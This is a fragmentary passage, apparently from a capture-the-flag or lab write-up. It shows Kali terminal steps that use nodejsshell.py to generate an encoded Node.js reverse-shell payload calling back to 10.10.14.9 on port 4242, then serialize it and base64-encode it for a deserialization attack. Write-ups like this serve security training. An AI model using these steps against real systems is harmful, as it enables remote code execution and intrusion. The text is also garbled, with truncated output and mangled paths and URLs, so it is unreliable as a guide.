...
Starting Nmap 7.80 ( https:/ map.org ) at 2020-06-08 04:21 EDT
...
https://github.com/ajinabraham ode.Js-Security-Course

```
kali@kali:~ ode.Js-Security-Course$ python nodejsshell.py 10.10.14.9 4242
[+] LHOST = 10.10.14.9
[+] LPORT = 4242
[+] Encoding
...
```
kali@kali:~ ode.Js-Security-Course$ node log.js 
Serialized: 
...
kali@kali:~ ode.Js-Security-Course$ base64 payload.txt | tr -d '\n'
